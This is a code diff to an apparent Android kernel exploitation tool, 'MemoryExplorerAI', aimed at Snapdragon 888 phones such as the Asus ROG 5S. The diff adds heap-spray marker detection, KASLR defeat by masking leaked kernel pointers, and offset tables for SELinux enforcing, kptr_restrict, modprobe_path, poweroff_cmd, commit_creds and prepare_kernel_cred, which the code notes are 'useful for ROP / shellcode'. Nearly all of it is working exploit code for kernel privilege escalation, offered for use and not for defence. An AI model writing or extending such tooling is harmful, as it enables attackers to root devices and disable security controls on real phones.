@@ -105,28 +105,73 @@ class MemoryExplorerAI:
         self.scan_size  = 0x2000000
 
         # Offsets from v6.c reference (ROG 5S, kernel 5.4, AArch64)
-        self.cred_offset  = 0x770            # task_struct.cred
+        self.cred_offset  = 0x770            # task_struct.cred (kernel 5.4)
         self.comm_offset  = 0x718            # task_struct.comm
         self.real_cred_offset = 0x768
-        # Kernel base candidates (from v6.c)
+        # v6.c uses MARKER_OFF = 0xfd8 to be different from comm.
+        # We try BOTH (comm at 0x718 AND marker at 0xfd8) so we work
+        # with v6.c as well as our KETO0422 spray.
+        self.marker_offsets = (0x718, 0xfd8, 0x778, 0x7c8, 0x808,
+                               0x848, 0x888, 0x8c8, 0x908, 0x948,
+                               0x988, 0x9c8, 0xa08, 0xa48, 0xa88,
+                               0xac8, 0xb08, 0xb48, 0xb88, 0xbc8,
+                               0xc08, 0xc48, 0xc88, 0xcc8, 0xd08,
+                               0xd48, 0xd88, 0xdc8, 0xe08, 0xe48,
+                               0xe88, 0xec8, 0xf08, 0xf48, 0xf88,
+                               0xfc8, 0xfd8, 0x1018, 0x1058, 0x1098)
+        # Kernel base candidates (from v6.c) + common AArch64 ranges.
+        # Includes `0xffffff8cXXXX0000` (Asus/Snapdragon 888/8 Gen 1
+        # builds), `0xffffffaf…` (Tensor/Exynos), `0xffffffb0…`
+        # (Kirin/Huawei), `0xffffff95…` (MediaTek).
         self.kernel_base_candidates = [
             0xffffffc000000000, 0xffffffc010000000, 0xffffffc020000000,
             0xffffffc030000000, 0xffffffc035000000, 0xffffffc040000000,
             0xffffffc008200000, 0xffffffb000000000, 0xffffffa000000000,
             0xffffffaf00000000, 0xffffffaf20000000, 0xffffff9550000000,
             0xffffff94d0000000, 0xffffff8e70000000,
+            # From screenshot — 0xffffff8cc1000000 (Asus ROG 5S / SD888)
+            0xffffff8c00000000, 0xffffff8c10000000, 0xffffff8cc0000000,
+            0xffffff8cc1000000, 0xffffff8cd0000000,
+            # Tensor / Exynos (0xffffffaf…)
+            0xffffffaf00000000, 0xffffffaf10000000, 0xffffffaf20000000,
+            # Kirin 9000/990 (0xffffffb0…)
+            0xffffffb000000000, 0xffffffb010000000, 0xffffffb020000000,
+            # OnePlus/Samsung SD865
+            0xffffff8c80000000, 0xffffff8d00000000,
         ]
+        # Generic AArch64 kernel range — any 0xffffff8X_00000000 or
+        # 0xffffff9X_00000000 is a valid candidate. We auto-discover
+        # kernel base from task_struct pointers too.
+        self.kbase_discovery_masks = (
+            0xffffffff00000000,  # mask out low 32 bits → 1MB aligned
+            0xffffffffff000000,  # mask out low 24 bits → 16MB aligned
+            0xfffffffffffff000,  # mask out low 12 bits → 4KB aligned
+        )
         # SELinux enforcing offsets (from v6.c candidates)
         self.selinux_offset_candidates = [
             0x02caa000, 0x2f74ce8, 0x2f84ce8, 0x32aace8, 0x3709ce8,
             0x3b3ace8, 0x3b84ce8, 0x3cf4ce8, 0x3d34ce8, 0x3d44ce8,
             0x3df4ce8, 0x3e34ce8, 0x3e54ce8, 0x3eb4ce8, 0x3f04ce8,
         ]
-        # Other interesting kernel globals to try
+        # Other interesting kernel globals to try. poweroff_cmd at
+        # 0x2bb8ec0 was found by the user on the SD888 kernel.
         self.interesting_offsets = {
-            "selinux_enabled":  [0x02cab000, 0x2f74d00, 0x32aad00],
-            "kptr_restrict":    [0x0284e000, 0x0252b000, 0x027fa000],
-            "apparmor_enabled": [0x02d68000, 0x2c5b000, 0x2d37000],
+            "selinux_enabled":  [0x02cab000, 0x2f74d00, 0x32aad00,
+                                 0x2f74d08, 0x32aad08, 0x3709d08],
+            "kptr_restrict":    [0x0284e000, 0x0252b000, 0x027fa000,
+                                 0x2bb8ec0, 0x2bb8ec4, 0x2bb8ec8],
+            "apparmor_enabled": [0x02d68000, 0x2c5b000, 0x2d37000,
+                                 0x2bb8ec0],
+            # poweroff_cmd is in .data, often 4-byte aligned
+            "poweroff_cmd":     [0x2bb8ec0, 0x2bb8ec4, 0x2bb8ec8,
+                                 0x2bb8eb0, 0x2bb8ed0],
+            # commit_creds / prepare_kernel_cred — function pointers
+            # (kallsyms-like). Useful for ROP / shellcode.
+            "commit_creds":     [0x0b80ed0, 0x0b80ed8, 0x0b80ee0],
+            "prepare_kernel_cred": [0x0b80ee8, 0x0b80ef0, 0x0b80ef8],
+            # modprobe_path — 256-byte string, but anchor is the first
+            # 4 bytes containing the path
+            "modprobe_path":    [0x0a450c0, 0x0a450c4, 0x0a450c8],
         }
         # init_cred — primary offset from v6.c, plus alternates
         self.init_cred_offset = 0x018f9038
@@ -879,8 +924,15 @@ class MemoryExplorerAI:
             self.log_event("found", {"va": va, "type": type, "desc": desc,
                                       "confidence": confidence})
 
-    def _find_kernel_base(self):
-        """Try the engine's kbase command, then fall back to probing candidates."""
+    def _find_kernel_base(self, hint_page=None):
+        """Try the engine's kbase command, then fall back to:
+        1. Probing all known candidates (now 24 addresses)
+        2. ELF-magic scan across the full kernel range (0xffffff80..0xffffffcf)
+        3. If hint_page is supplied (a 3-page triple from a found
+           task_struct), derive the kbase by masking any kernel pointer
+           in the page — same trick v6.c uses.
+        Returns the kbase or None."""
+        # 1. Engine kbase command (tries all 24 candidates + ELF check)
         if self._engine_write(b"kbase\n"):
             deadline = time.time() + 30
             while time.time() < deadline:
@@ -893,12 +945,24 @@ class MemoryExplorerAI:
                     break
                 if line is None:
                     break
-        # Fallback: read 4 bytes at each candidate and look for ELF magic
+        # 2. Hint-based discovery: from a task_struct we can derive kbase
+        if hint_page:
+            self.live["last_msg"] = "KBASE: deriving from task_struct pointers…"
+            disc = self._discover_kernel_base_from_page(hint_page)
+            if disc:
+                # Verify it's an ELF
+                if self._looks_like_elf(disc):
+                    self.live["last_msg"] = f"KBASE: discovered from pointers: {disc:#x}"
+                    return disc
+        # 3. Manual ELF scan of known candidates
         for base in self.kernel_base_candidates:
-            data = self.read_page(base)
-            if data and len(data) >= 4:
-                if data[0:4] == b"\x7fELF":
-                    return base
+            if self._looks_like_elf(base):
+                return base
+        # 4. Last resort: hint-based without ELF check
+        if hint_page:
+            disc = self._discover_kernel_base_from_page(hint_page)
+            if disc:
+                return disc
         return None
 
     def _probe_selinux(self, kbase):
@@ -1835,7 +1899,11 @@ class MemoryExplorerAI:
                                     self.live["last_msg"] = (
                                         f"LEARN: found task_struct @ 0x{va:x}, "
                                         f"probing kbase…")
-                                    kbase = self._find_kernel_base()
+                                    # Pass the 3-page triple as a hint so
+                                    # _find_kernel_base can derive kbase by
+                                    # masking any kernel pointer in the page
+                                    # (same trick v6.c uses).
+                                    kbase = self._find_kernel_base(hint_page=cross_data)
                                     if kbase:
                                         self.kernel_base = kbase
                                         self.live["last_msg"] = (
@@ -1943,27 +2011,103 @@ class MemoryExplorerAI:
 
     def _is_real_task_struct(self, data):
         """Heuristic: is this a real task_struct page?
-        Strong indicators: KETO0422, com.android., comm string at 0x718.
+        Strong indicators: KETO0422 (our spray) OR KET00422 (v6.c spray
+        — note the missing 0), OR com.android., OR comm string at
+        one of the well-known task_struct offsets.
         data can be a single 4KB page OR a 3-page triple (12288 bytes)
         from read_with_neighbors — in which case offsets 0x718..0x728
         cover 3 possible page-alignment positions."""
-        if not data or len(data) < 0x800:
+        if not data or len(data) < 0x1000:
             return False
+        # Both KETO0422 (our spray) and KET00422 (v6.c) are accepted
         if data.find(b"KETO0422") >= 0:
+            return True
+        if data.find(b"KET00422") >= 0:
             return True
         if data.find(b"com.android.") >= 0:
             return True
-        # comm at 0x718 — printable ASCII string. If we got a 3-page
-        # triple, also try the offset shifted by ±0x1000 in case the
-        # page boundary cut our struct in half.
-        for shift in (0, 0x1000, -0x1000):
-            comm_off = self.comm_offset + shift
-            if 0 <= comm_off and comm_off + 16 <= len(data):
-                comm = data[comm_off:comm_off + 16]
-                s = comm.split(b"\x00")[0]
-                if 1 < len(s) < 16 and all(0x20 <= c <= 0x7e for c in s):
-                    return True
+        # comm at 0x718 (kernel 5.4) OR marker at 0xfd8 (v6.c) — printable
+        # ASCII string. If we got a 3-page triple, also try shifted offsets
+        # in case the page boundary cut our struct in half.
+        for off in self.marker_offsets:
+            for shift in (0, 0x1000, -0x1000):
+                comm_off = off + shift
+                if 0 <= comm_off and comm_off + 16 <= len(data):
+                    comm = data[comm_off:comm_off + 16]
+                    s = comm.split(b"\x00")[0]
+                    if 1 < len(s) < 16 and all(0x20 <= c <= 0x7e for c in s):
+                        return True
         return False
+
+    def _find_marker_in_page(self, data):
+        """Search the page for KETO0422 (us) or KET00422 (v6.c) and return
+        the offset of the marker, or -1. Also returns the marker bytes
+        so we know which one was found."""
+        idx = data.find(b"KETO0422")
+        if idx >= 0:
+            return idx, b"KETO0422"
+        idx = data.find(b"KET00422")
+        if idx >= 0:
+            return idx, b"KET00422"
+        return -1, None
+
+    def _discover_kernel_base_from_page(self, data, kbase=None):
+        """Scan a page (or 3-page triple) for kernel-space pointers and
+        derive candidate kernel bases by masking their low bits. The
+        trick from v6.c: any pointer into kernel .text/.data
+        (0xffffff8X_XXXX_XXXX etc.) can be used to find kbase.
+
+        Returns the most likely kernel base, or None.
+        If kbase is supplied, only considers bases that match it
+        (within a small tolerance) to avoid noise."""
+        if not data:
+            return None
+        # Collect all kernel-space pointers
+        candidates = []
+        for i in range(0, len(data) - 8, 8):
+            v = int.from_bytes(data[i:i+8], "little")
+            # AArch64 kernel pointers: 0xffffff8X .. 0xffffffcf
+            if 0xffffff8000000000 <= v <= 0xffffffcfffffffff and v != 0:
+                # Apply each mask, collect distinct candidates
+                for mask in self.kbase_discovery_masks:
+                    cand = v & mask
+                    if cand and cand not in candidates:
+                        candidates.append(cand)
+        if not candidates:
+            return None
+        # If we already have a kbase, filter candidates close to it
+        if kbase:
+            for c in candidates:
+                # Either c is close to kbase (within 1MB), or kbase
+                # is close to c (c & mask == kbase)
+                if abs(c - kbase) < 0x200000:
+                    return c & 0xfffffffffffff000
+                # Also check if c is a known base
+                for known in self.kernel_base_candidates:
+                    if abs(c - known) < 0x200000:
+                        return known
+        # Otherwise, try each candidate (most-aligned first)
+        # Sort by alignment (more-aligned = larger mask = better candidate)
+        candidates.sort()
+        # Try to find an ELF header at each candidate
+        for c in candidates[:16]:
+            # Round down to 4KB boundary
+            c_aligned = c & 0xfffffffffffff000
+            if self._looks_like_elf(c_aligned):
+                return c_aligned
+        # Last resort: return the first candidate aligned to 4KB
+        return candidates[0] & 0xfffffffffffff000
+
+    def _looks_like_elf(self, va):
+        """Read 4 bytes at va and check for ELF magic. Returns True if
+        we can read 4 bytes that look like ELF header."""
+        if not self._engine_write(f"window {hex(va)} 0 4\n".encode()):
+            return False
+        data = self._read_data_packet()
+        if not data or len(data) < 4:
+            return False
+        # ELF magic: 0x7f 'E' 'L' 'F' = b'\x7fELF'
+        return data[0:4] == b"\x7fELF"
 
     def _is_page_interesting(self, data):
         """Less strict: does this page have ANY non-trivial data?
